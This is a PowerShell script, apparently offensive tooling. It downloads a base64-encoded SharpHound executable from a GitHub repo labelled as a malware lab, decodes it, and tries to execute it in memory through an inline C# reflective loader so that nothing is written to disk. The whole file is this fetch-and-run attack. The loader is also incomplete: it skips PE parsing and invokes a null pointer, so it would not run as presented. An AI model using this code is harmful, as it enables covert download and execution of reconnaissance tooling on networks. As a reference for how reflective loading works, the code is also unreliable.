# Define the URL containing the base64 encoded string
$url = "https://raw.githubusercontent.com/MalwareLab49/SharpHound_Encoded/main/b64"

# Download the base64 encoded string from the URL
$base64String = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content

# Decode the base64 string to a byte array
$exeBytes = [System.Convert]::FromBase64String($base64String)

# Define a function to load and run the executable in memory
function Invoke-ReflectivePE {
    param (
        [byte[]]$PEBytes
    )

    # Allocate memory for the executable
    $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $mem, $PEBytes.Length)

    # Define necessary delegates
    $ExecuteDelegate = @"
using System;
using System.Runtime.InteropServices;

public class PELoader
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr GetProcAddressDelegate(IntPtr hModule, string procName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr LoadLibraryDelegate(string name);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void RunPE();

    public static void Execute(IntPtr mem)
    {
        IntPtr pe = mem;
        IntPtr shellcode = IntPtr.Zero;

        // (Skipping PE parsing and relocation logic for brevity)

        RunPE run = Marshal.GetDelegateForFunctionPointer<RunPE>(shellcode);
        run();
    }
}
"@

    Add-Type -TypeDefinition $ExecuteDelegate -Language CSharp
    [PELoader]::Execute($mem)

    # Free the allocated memory
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($mem)
}

# Invoke the reflective PE loader function with the decoded executable bytes
Invoke-ReflectivePE -PEBytes $exeBytes
